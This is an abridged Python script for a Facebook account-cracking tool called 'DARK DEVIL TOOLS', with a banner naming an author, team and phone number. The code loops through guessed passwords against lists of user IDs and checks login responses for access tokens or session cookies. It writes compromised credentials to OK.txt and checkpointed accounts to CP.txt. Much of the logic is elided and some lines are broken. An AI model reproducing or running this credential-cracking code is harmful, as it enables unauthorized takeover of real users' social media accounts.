...
class __crack__:
    ...
    def plerr(self):
        ...
        if _jokowi_kontol_ in ('M', 'm'):
                ...
                if pwek == '':
                    ...
                    def _sempak_(bse=None):
                        ...
                        if boy == '':
                            ...
                            IMTIAZ_AKING('\n[•] Result OK saved to OMI-OK.txt')
                            IMTIAZ_AKING('[•] Result CP saved to OMI-CP.txt')
                            IMTIAZ_AKING('\n\tCrack Processing...\n')
                            IMTIAZ_AKING('\n\tCrack Processing...\n\n'); 
            ...
            IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
            print (' \x1b[1;91m❥━[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m=============================================')
            IMTIAZ_AKING(' [1] DARK  Method 1 ')
            IMTIAZ_AKING(' [2] DARK  Method 2  [ Pro ]')
            IMTIAZ_AKING(' [3] DARK Method 3   ')
            print (' \x1b[1;91m❥━[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m=============================================')
            self.__pler__()
        else:
    ...
    def __api__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;92m [DARK ] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            ...
            if "access_token" in p:
                IMTIAZ_AKING('\r\033[1;92m[SUCCESSFULL-DARK ] %s | %s%s      '%(user,pw,tahun(user)))
                ...
                try:
                    ...
                    IMTIAZ_AKING('\r\033[1;92m[SUCCESSFULL-DARK]  %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    ...
                    pass
                IMTIAZ_AKING('\r\033[1;91m[DARK-CHECKPOINT] %s | %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s%s' % (user,pw,tahun(user))
                cp.append(wrt)
    ...
    def __mbasic__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                IMTIAZ_AKING('\r\033[1;32m[SUCCESSFULL-DARK ]  %s | %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    IMTIAZ_AKING('\r\033[1;91m[DARK -CHECKPOINT] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
                    wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
                    cp.append(wrt)
                    open('CP.txt','a').write('%s\n' % wrt)
                    break
    ...
    def __mfb__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                IMTIAZ_AKING('\r\033[1;92m[[SUCCESSFULL-DARK]  %s | %s      '%(user,pw))
                wrt = '%s - %s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
...
\x1b[1;91m❥━[\x1b[1;93m•\x1b[1;91m]\033[1;37m    Author   : \033[1;32m DARK DEVIL OMI
\x1b[1;91m❥━[\x1b[1;93m•\x1b[1;91m]\033[1;37m    Facebook : \033[1;32m  ERROR 
\x1b[1;91m❥━[\x1b[1;93m•\x1b[1;91m]\033[1;37m    Team     : \033[1;33m FUCK TEAM 
\x1b[1;91m❥━[\x1b[1;93m•\x1b[1;91m]\033[1;37m    Connect  :\033[1;32m 01406115895
\x1b[1;91m❥━[\x1b[1;93m•\x1b[1;91m]\033[1;37m    YouTube  : \033[1;32mERROR
 \x1b[1;91m❥━[\x1b[1;93m•\x1b[1;91m]\033[1;33m========================================
          \033[1;31m•\033[1;93m•\033[1;37m\x1b[0;91m [ WELLCOME TO DARK DEVIL TOOLS ]\x1b[0;34m \033[1;33m•\033[1;91m•\033[1;37m
 \x1b[1;91m❥━[\x1b[1;93m•\x1b[1;91m]\033[1;33m========================================"""
ct = datetime.now()
n = ct.month
...
def mk():
    ...
    if to in r:
        ...
        print("")
        print(" This Tool is PAID  so  Need Approval  ")
        print("")
